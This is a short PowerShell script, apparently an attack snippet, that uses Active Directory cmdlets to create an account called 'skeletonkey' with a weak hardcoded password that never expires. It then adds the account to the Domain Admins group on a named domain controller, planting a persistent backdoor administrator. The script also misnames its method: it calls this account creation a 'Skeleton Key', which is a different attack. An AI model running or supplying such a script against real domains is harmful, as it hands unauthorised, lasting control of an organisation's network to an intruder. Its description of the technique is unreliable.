# Import the ActiveDirectory module to access AD cmdlets
Import-Module ActiveDirectory

# Set the domain controller to target
$dc = "dc01.dbz.com"

# Set the domain to target
$domain = "dbz.com"

# Set the username and password for the Skeleton Key account
$username = "skeletonkey"
$password = "P@ssw0rd"

# Create the Skeleton Key account in the domain
New-ADUser -Server $dc -Name $username -AccountPassword (ConvertTo-SecureString $password -AsPlainText -Force) -PasswordNeverExpires $true -Enabled $true

# Add the Skeleton Key account to the Domain Admins group
Add-ADPrincipalGroupMembership -Identity $username -MemberOf "Domain Admins" -Server $dc